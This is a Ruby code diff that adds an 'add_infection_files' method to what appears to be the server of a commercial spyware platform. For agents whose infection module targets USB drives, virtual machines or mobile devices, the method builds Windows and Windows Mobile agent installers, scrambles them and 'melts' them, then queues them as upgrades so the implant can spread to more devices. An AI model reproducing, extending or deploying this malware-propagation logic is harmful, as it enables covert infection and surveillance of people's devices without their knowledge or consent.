@@ -169,6 +169,41 @@ class Item
     return agent
   end
 
+  def add_infection_files
+    config = JSON.parse(self.configs.last.config)
+
+    config['modules'].each do |mod|
+      if mod['module'] == 'infection'
+
+        if mod['usb'] or mod['vm'] > 0
+          factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+          build = RCS::DB::Build.factory(:windows)
+          build.load({'_id' => factory._id})
+          build.unpack
+          build.patch({'demo' => self.demo})
+          build.scramble
+          build.melt({'admin' => false})
+          add_upgrade('installer', File.join(build.tmpdir, 'output'))
+          build.clean
+        end
+
+        if mod['mobile']
+          factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+          build = RCS::DB::Build.factory(:winmo)
+          build.load({'_id' => factory._id})
+          build.unpack
+          build.patch({'demo' => self.demo})
+          build.scramble
+          build.melt({'admin' => false})
+          add_upgrade('wmcore.001', File.join(build.tmpdir, 'firstsage'))
+          add_upgrade('wmcore.002', File.join(build.tmpdir, 'zoo'))
+          build.clean
+        end
+      end
+    end
+
+  end
+
   def add_first_time_uploads
     return if self[:_kind] != 'agent'
 
